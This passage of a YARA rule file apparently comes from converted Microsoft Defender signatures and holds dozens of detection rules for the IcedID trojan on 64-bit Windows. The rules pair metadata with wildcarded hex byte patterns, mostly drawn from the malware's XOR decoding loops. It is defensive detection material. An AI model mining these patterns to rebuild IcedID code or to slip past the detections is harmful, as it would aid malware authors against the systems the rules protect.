        $x_1_3 = "Ljaskdassd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_TG_2147835288_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.TG!MTB"
        threat_id = "2147835288"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 63 0c 24 48 8b 94 24 ?? ?? ?? ?? e9 ?? ?? ?? ?? 0f b6 04 01 8b 8c 24 ?? ?? ?? ?? eb 00 33 c8 8b c1 eb dc}  //weight: 1, accuracy: Low
        $x_1_2 = {88 04 0a e9}  //weight: 1, accuracy: High
        $x_1_3 = "Ljaskdassd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SI_2147835353_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SI!MTB"
        threat_id = "2147835353"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {33 c8 8b c1 eb ?? 48 98 48 ?? ?? ?? ?? ?? ?? ?? eb ?? 83 84 24 ?? ?? ?? ?? ?? c7 84 24 ?? ?? ?? ?? ?? ?? ?? ?? eb ?? 48 ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? ?? e9 ?? ?? ?? ?? f7 bc 24 ?? ?? ?? ?? 8b c2}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_PB_2147835403_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.PB!MTB"
        threat_id = "2147835403"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {49 89 c0 4c 03 45 d0 8b 45 dc 48 98 48 03 45 20 44 0f b6 08 8b 4d dc ba ?? ?? ?? ?? 89 c8 f7 ea c1 fa 03 89 c8 c1 f8 1f 89 d3 29 c3 89 d8 6b c0 3b 89 ca 29 c2 89 d0 48 98 48 03 45 c8 0f b6 00 44 31 c8 41 88 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SJ_2147835418_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SJ!MTB"
        threat_id = "2147835418"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b 8c 24 ?? ?? ?? ?? eb ?? 83 84 24 ?? ?? ?? ?? ?? c7 84 24 ?? ?? ?? ?? ?? ?? ?? ?? e9 ?? ?? ?? ?? 33 c8 8b c1 eb}  //weight: 1, accuracy: Low
        $x_1_2 = {ff c0 89 04 24 e9 ?? ?? ?? ?? 0f b6 04 01 89 44 24 ?? eb ?? 80 44 24 ?? ?? c6 44 24 ?? ?? e9 ?? ?? ?? ?? 80 44 24 ?? ?? c6 44 24 ?? ?? eb ?? f7 bc 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_CTC_2147835578_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.CTC!MTB"
        threat_id = "2147835578"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {89 d0 01 c0 89 c2 c1 e2 04 29 c2 89 c8 29 d0 48 63 d0 48 8b 45 ?? 48 01 d0 0f b6 00 44 31 c8 41 88 00 83 45 fc ?? 8b 45 fc 3b 45 ?? 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SK_2147835595_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SK!MTB"
        threat_id = "2147835595"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b c1 48 63 0c 24 eb ?? 8b 4c 24 ?? 33 c8 eb ?? 89 44 24}  //weight: 1, accuracy: Low
        $x_1_2 = {c3 99 f7 7c 24 ?? eb ?? 8b c2 48 ?? eb ?? 48 ?? ?? ?? c7 04 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SL_2147835596_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SL!MTB"
        threat_id = "2147835596"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {99 f7 7c 24 ?? eb ?? 89 44 24 ?? 8b 04 24 eb ?? 48 ?? ?? ?? c7 04 24 ?? ?? ?? ?? eb ?? eb ?? 8b 4c 24 ?? 33 c8 eb ?? 48}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RDC_2147835632_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RDC!MTB"
        threat_id = "2147835632"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {c1 f8 04 89 c2 89 c8 c1 f8 1f 29 c2 89 d0 01 c0 89 c2 c1 e2 04 29 c2 89 c8 29 d0 48 63 d0 48 8b 45 e8 48 01 d0 0f b6 00 44 31 c8}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_LK_2147835672_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.LK!MTB"
        threat_id = "2147835672"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 4c 24 04 33 c8 eb ?? 89 44 24 04 8b 04 24 eb ?? 99 f7 bc 24 ?? ?? ?? ?? eb ?? 8b c2 48 98 eb ?? 48 8b 8c 24 ?? ?? ?? ?? 0f b6 04 01 eb ?? 8b c1 48 63 0c 24 eb ?? 48 8b 94 24 ?? ?? ?? ?? 88 04 0a eb}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SMG_2147835674_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SMG!MTB"
        threat_id = "2147835674"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {41 01 eb 4d 63 db 44 01 c2 c1 fa 05 29 c2 0f af d7 29 d1 48 63 c9 41 0f b6 04 0a 42 32 04 06 49 83 c0 01 44 39 c3 43 88 04 19 0f 87 57}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SMG_2147835674_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SMG!MTB"
        threat_id = "2147835674"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 f7 f1 48 8b c2 ?? 8b 4c 24 48 66 3b c9}  //weight: 1, accuracy: Low
        $x_1_2 = {0f b6 44 01 ?? 8b 4c 24 ?? 33 c8 66 3b}  //weight: 1, accuracy: Low
        $x_1_3 = {8b c1 48 63 4c 24 ?? 48 8b 54 24 ?? e9}  //weight: 1, accuracy: Low
        $x_1_4 = {88 04 0a e9}  //weight: 1, accuracy: High
        $x_1_5 = "init" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_HAL_2147835690_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.HAL!MTB"
        threat_id = "2147835690"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 63 d0 48 8b 45 ?? 4c 8d 04 02 8b 45 fc 48 63 d0 48 8b 45 ?? 48 01 d0 44 0f b6 08 8b 4d fc ba}  //weight: 1, accuracy: Low
        $x_1_2 = {0f af c2 01 c8 48 63 d0 48 8b 45 ?? 48 01 d0 0f b6 00 44 31 c8 41 88 00 83 45 fc ?? 8b 45 fc 3b 45 ?? 0f 82}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SM_2147835896_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SM!MTB"
        threat_id = "2147835896"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {88 04 0a e9 ?? ?? ?? ?? e9 ?? ?? ?? ?? 8b c1 48 ?? ?? ?? eb ?? 8b 4c 24 ?? 33 c8 eb ?? 8b c2}  //weight: 1, accuracy: Low
        $x_1_2 = {48 81 ec 98 ?? ?? ?? c7 44 24 ?? ?? ?? ?? ?? eb ?? 83 44 24 ?? ?? c7 44 24 ?? ?? ?? ?? ?? e9 ?? ?? ?? ?? 8b 04 24 ff c0 e9}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win64_IcedID_SN_2147836075_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SN!MTB"
        threat_id = "2147836075"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 89 c2 48 83 ca ?? 0f 10 0c 11 48 8b 55 ?? f3 0f 7f 04 02 49 89 c0 49 81 c8 ?? ?? ?? ?? f3 42 ?? ?? ?? ?? 48 05 ?? ?? ?? ?? 4c 8b 45 ?? 4c 39 c0 48 ?? ?? ?? 75}  //weight: 1, accuracy: Low
        $x_1_2 = {53 ad 64 9f e8 fa 46 6b fc 6f 5a f9 e2 37 5f 3c}  //weight: 1, accuracy: High
        $x_1_3 = {4c f2 c0 28 40 ec ec a9 a7 d2 53 c6 ad 7e 0b 27}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SO_2147836099_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SO!MTB"
        threat_id = "2147836099"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f b6 04 01 eb ?? 8b 4c 24 ?? 33 c8 eb ?? 99 f7 7c 24 ?? eb ?? 8b c1}  //weight: 1, accuracy: Low
        $x_1_2 = {8b 04 24 ff c0 eb ?? 8b c2 48 ?? eb ?? 48 ?? ?? ?? c7 04 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ROM_2147836358_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ROM!MTB"
        threat_id = "2147836358"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f af c2 01 c8 48 63 d0 48 8b 45 ?? 48 01 d0 0f b6 00 44 31 c8 41 88 00 83 45 fc ?? 8b 45 ?? 8b 0d ?? ?? ?? ?? 8b 15 ?? ?? ?? ?? 0f af d1 8b 4d ?? 29 d1 8b 15 ?? ?? ?? ?? 01 ca 39 d0 0f 82}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SP_2147836365_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SP!MTB"
        threat_id = "2147836365"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f b6 00 44 ?? ?? 41 ?? ?? 83 45 ?? ?? 8b 45 ?? 8b 0d ?? ?? ?? ?? 8b 15 ?? ?? ?? ?? 0f af d1 8b 4d ?? 29 d1 8b 15}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SR_2147836627_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SR!MTB"
        threat_id = "2147836627"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 8a 0e 49 ff c6 88 0a 48 ff c2 48 83 ee ?? 75}  //weight: 1, accuracy: Low
        $x_1_2 = {49 8b cf 8b c2 ff c2 83 e0 ?? 8a 44 38 ?? 30 01 48 ?? ?? 3b 54 24 ?? 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_KAS_2147836726_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.KAS!MTB"
        threat_id = "2147836726"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {99 44 8b 8d ?? ?? ?? ?? 41 f7 f9 03 15 ?? ?? ?? ?? 03 15 ?? ?? ?? ?? 03 15 ?? ?? ?? ?? 4c 63 d2 42 0f b6 14 11 41 31 d0 45 88 c3 48 8b 8d ?? ?? ?? ?? 8b 95 ?? ?? ?? ?? 2b 15 ?? ?? ?? ?? 44 8b 05 ?? ?? ?? ?? 44 0f af 05 ?? ?? ?? ?? 44 29 c2 44 8b 05}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AI_2147836951_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AI!MTB"
        threat_id = "2147836951"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hixComputeTextGeometry" ascii //weight: 1
        $x_1_2 = "hixDItemGetAnchor" ascii //weight: 1
        $x_1_3 = "hixDItemStyleChanged" ascii //weight: 1
        $x_1_4 = "hixDItemStyleConfigureGCs" ascii //weight: 1
        $x_1_5 = "hixFm_AddToMaster" ascii //weight: 1
        $x_1_6 = "hixFm_Configure" ascii //weight: 1
        $x_1_7 = "hixFm_DeleteMaster" ascii //weight: 1
        $x_1_8 = "hixFm_FindClientPtrByName" ascii //weight: 1
        $x_1_9 = "hixFm_ForgetOneClient" ascii //weight: 1
        $x_1_10 = "hixFm_FreeMasterInfo" ascii //weight: 1
        $x_1_11 = "hixFm_GetFormInfo" ascii //weight: 1
        $x_1_12 = "hixFm_UnlinkFromMaster" ascii //weight: 1
        $x_1_13 = "hixGridDataDeleteEntry" ascii //weight: 1
        $x_1_14 = "RtlVirtualUnwind" ascii //weight: 1
        $x_1_15 = "RtlCaptureContext" ascii //weight: 1
        $x_1_16 = "GetCurrentProcess" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ST_2147837458_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ST!MTB"
        threat_id = "2147837458"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 04 24 ff c0 eb ?? 99 f7 7c 24 ?? eb ?? 48 83 ec ?? c7 04 24}  //weight: 1, accuracy: Low
        $x_1_2 = {0f b6 04 01 eb ?? 8b 4c 24 ?? 33 c8 eb ?? 8b c2}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SU_2147837544_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SU!MTB"
        threat_id = "2147837544"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 04 24 eb ?? 48 ?? ?? ?? c7 04 24 ?? ?? ?? ?? eb ?? eb ?? 8b 4c 24 ?? 33 c8 eb ?? ?? f7 7c 24 ?? eb ?? 89 54 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_NEAA_2147837660_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.NEAA!MTB"
        threat_id = "2147837660"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {45 01 e3 41 29 cb 44 01 d8 48 98 8a 04 02 42 32 44 15 00 43 88 44 15 00 49 ff c2 e9 24 ff ff ff}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_NEAB_2147837661_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.NEAB!MTB"
        threat_id = "2147837661"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8b 44 24 44 ff c0 89 44 24 44 8b 84 24 98 00 00 00 39 44 24 44 73 48 48 63 44 24 44 48 8b 4c 24 58 0f b6 04 01 89 44 24 68 48 63 4c 24 44 33 d2 48 8b c1 b9 08 00 00 00 48 f7 f1 48 8b c2 48 8b 4c 24 48 0f b6 44 01 10 8b 4c 24 68 33 c8 8b c1 48 63 4c 24 44 48 8b 54 24 58 88 04 0a eb a1}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GBY_2147837714_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GBY!MTB"
        threat_id = "2147837714"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {f7 eb 8b cb 03 d3 ff c3 c1 fa 05 8b c2 c1 e8 1f 03 d0 6b c2 33 2b c8 48 8b 44 24 28 48 63 d1 42 0f b6 8c 3a ?? ?? ?? ?? 41 32 4c 00 ff 43 88 4c 08 ff 3b 5c 24 20 72}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RDB_2147838223_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RDB!MTB"
        threat_id = "2147838223"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {66 41 83 c1 20 49 83 c2 02 41 c1 c0 07 41 0f b7 c1 ff c3 44 33 c0 45 0f b7 0a 66 45 85 c9}  //weight: 2, accuracy: High
        $x_2_2 = {45 33 c0 48 8d 41 01 41 8a d0 02 11 42 30 14 00 49 ff c0 49 83 f8 19}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_TS_2147838485_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.TS!MTB"
        threat_id = "2147838485"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f b6 04 01 48 63 4c 24 ?? eb}  //weight: 1, accuracy: Low
        $x_1_2 = {0f b6 8c 0c c0 00 00 00 33 c1 e9}  //weight: 1, accuracy: High
        $x_1_3 = {48 63 4c 24 1c 48 8b 94 24 ?? ?? ?? ?? e9}  //weight: 1, accuracy: Low
        $x_1_4 = {88 04 0a e9}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EE_2147839168_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EE!MTB"
        threat_id = "2147839168"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {f7 eb c1 fa ?? 8b c2 c1 e8 ?? 03 d0 8b c3 ff c3 8d 0c 52 c1 e1 ?? 2b c1 48 63 c8 48 8b 44 24 ?? 42 0f b6 8c 39 ?? ?? ?? ?? 41 32 4c 00 ?? 43 88 4c 08 ?? 3b 5c 24 ?? 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SZ_2147839195_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SZ!MTB"
        threat_id = "2147839195"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {33 c8 66 3b ed 0f 84 ?? ?? ?? ?? 48 ?? ?? 48 ?? ?? 48 ?? ?? ?? ?? 66 ?? ?? 74 ?? 8b 84 24 20 00 8b 4c 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AB_2147839305_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AB!MTB"
        threat_id = "2147839305"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 00 89 84 24 ?? ?? ?? ?? e9 ?? ?? ?? ?? 8b 4c 24 ?? 33 c8 3a db 74}  //weight: 1, accuracy: Low
        $x_1_2 = {8b c1 48 63 4c 24 ?? 66 3b f6 0f 84 ?? ?? ?? ?? 48 f7 f1 48 8b c2 3a d2 74 ?? 48 ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? ?? 66}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AB_2147839305_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AB!MTB"
        threat_id = "2147839305"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f b6 04 01 89 44 24 68 48 63 4c 24 44 66 ?? ?? 33 d2 48 8b c1 b9 08 00 00 00 ?? ?? ?? 48 f7 f1 48 8b c2 48 8b 4c 24 48 3a ?? 0f b6 44 01 ?? 8b 4c 24 68 33 c8 3a ?? 74}  //weight: 1, accuracy: Low
        $x_1_2 = {0f b6 04 01 89 44 24 68 48 63 4c 24 44 3a ?? 33 d2 48 8b c1 b9 08 00 00 00 ?? ?? 48 f7 f1 48 8b c2 48 8b 4c 24 48 66 3b ?? 0f b6 44 01 ?? 8b 4c 24 68 33 c8 66 3b}  //weight: 1, accuracy: Low
        $x_1_3 = {8b c1 48 63 4c 24 44 48 8b 54 24 58 88 04 0a 8b 44 24 44 ff c0 89 44 24 44 8b 84 24 98 00 00 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Trojan_Win64_IcedID_BW_2147839563_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BW!MTB"
        threat_id = "2147839563"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {41 f7 ec d1 fa 8b c2 c1 e8 1f 03 d0 49 63 c4 41 83 c4 01 48 63 ca 48 6b c9 43 48 03 c8 48 8b 44 24 28 42 0f b6 8c 31 [0-4] 41 32 4c 00 ff 43 88 4c 18 ff 44 3b 64 24 20 72}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_IH_2147839574_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.IH!MTB"
        threat_id = "2147839574"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {89 84 24 c0 00 00 00 48 63 4c 24 44 66 3b d2 74 55 33 c8 8b c1 66 3b ed 74 3a}  //weight: 1, accuracy: High
        $x_1_2 = {48 63 4c 24 44 48 8b 94 24 a0 00 00 00 e9 ac 04 00 00}  //weight: 1, accuracy: High
        $x_1_3 = {88 04 0a e9}  //weight: 1, accuracy: High
        $x_1_4 = {8b 44 24 44 e9 2a ff ff ff}  //weight: 1, accuracy: High
        $x_1_5 = {ff c0 89 44 24 44 e9}  //weight: 1, accuracy: High
